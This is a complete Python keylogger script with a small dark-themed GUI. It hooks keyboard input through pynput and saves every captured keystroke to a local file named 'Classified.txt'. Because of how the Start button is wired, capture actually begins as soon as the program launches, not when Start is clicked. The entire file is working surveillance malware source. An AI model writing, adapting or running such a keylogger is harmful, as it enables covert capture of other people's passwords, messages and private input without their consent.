from tkinter import * 
from pynput.keyboard import Key, Listener 
import customtkinter
import threading

root = customtkinter.CTk()
root.title('Keylogger')
root.geometry("400x300")
customtkinter.set_appearance_mode('dark')
customtkinter.set_default_color_theme('green')

def start_Keylogger():
    letter = []

    def pressing_keys(key):
        letter.append(key)
        write_in_file(letter)
        print(key)

    def write_in_file(variable):
        with open('Classified.txt', 'w') as f:
            for i in variable:
                new_variable = str(i).replace("'","")
                if new_variable.find("space") > 0:
                    f.write('\n')
                
                elif new_variable.find("Key") == -1:
                    f.write(new_variable)
            

    def releasing_keys(key):
        if key == Key.esc:
            return False

    with Listener(on_press=pressing_keys, on_release=releasing_keys) as l:
        l.join()



def close():
   root.destroy()

button_start = customtkinter.CTkButton(master=root, text = 'Start',command = threading.Thread(target=start_Keylogger).start())
button_start.pack(pady=60)


buttton_stop = customtkinter.CTkButton(master=root, text = 'Stop',command = close)
buttton_stop.pack(pady=10)

root.mainloop()
